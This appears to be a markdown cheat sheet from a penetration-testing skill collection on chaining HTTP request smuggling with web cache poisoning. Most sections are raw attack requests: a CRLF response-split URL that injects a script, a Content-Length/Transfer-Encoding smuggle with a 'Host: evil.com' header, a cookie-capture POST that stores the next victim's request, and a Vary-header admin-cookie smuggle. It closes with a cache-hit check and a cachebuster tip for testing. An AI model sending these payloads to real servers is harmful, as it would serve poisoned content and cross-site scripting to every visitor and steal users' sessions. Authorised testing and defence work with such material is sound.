# Cache poisoning via smuggle — the desync + cache chain

## The shape — the smuggle feeds a cached key

A CDN or a caching proxy in front — the smuggle's response gets CACHED
under a different key than the request → every subsequent visitor gets
the poisoned cache entry.

## The response-split cache — `?x=%0d%0a%0d%0aHTTP/1.1 200 ...`

```text
GET /?x=%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

The fold splits the response into TWO — the first response is the app's,
the second is the injected `<script>alert(1)</script>` — a cache that
keys on the URL caches BOTH — the second response serves the next
requester → cached XSS — `../web-xss/`.

## The Host-keyed cache — `Host: evil.com` smuggle

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GET / HTTP/1.1
Host: evil.com
Content-Length: 15

x=1
0
```

The smuggle's `Host: evil.com` → the back-end serves `evil.com`'s
content → the cache keys on the URL (no Host keying) → the poisoned
content caches under `/` → every visitor gets `evil.com`'s content.

## The cookie-smuggle → cached-session

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

The next victim's request lands inside `x=` → `/store` caches/stores
the victim's request including `Cookie:` → session-steal — `session-hijack.md`.

## The cache-key mismatch — the front and cache disagree

The cache keys on `GET /` — the front parses `POST /` — the smuggle
makes the back-end run `GET /` while the cache records `POST /` — the
cached entry is mis-keyed → the next `GET /` serves the smuggle's
response.

## The Vary-header smuggle — `Vary: Cookie` poisoning

```text
GET / HTTP/1.1
Host: t
Cookie: admin=1
```

smuggled — the response is the admin's content — the cache keys on
the URL + `Vary: Cookie` → the admin's response caches under a
different Cookie-key → a visitor without the cookie gets the admin's
cached content.

## The common chain — desync → poison → cache

```text
1. desync — the smuggle lands
2. the smuggle's response goes to the next requester
3. the response is cacheable — the cache stores it
4. every subsequent request gets the cached poison
```

The chain escalates a one-shot smuggle into a persistent poison —
`web-cache-poisoning` — the cache's own skill.

## The detection — the cache-hit readback

```text
smuggle → GET / → the GET serves the smuggle's content →
a second GET / also serves it → cache-hit
```

A `X-Cache: HIT` or `Age:` header confirms the cache stored it.

## The cachebuster — the poison-key

Append a unique param `?cb=xyz` to the smuggle — the cache keys on it —
your poison lands under `?cb=xyz`, not `/` — the poison is scoped to
your key, not the real page — useful for testing without poisoning
production.
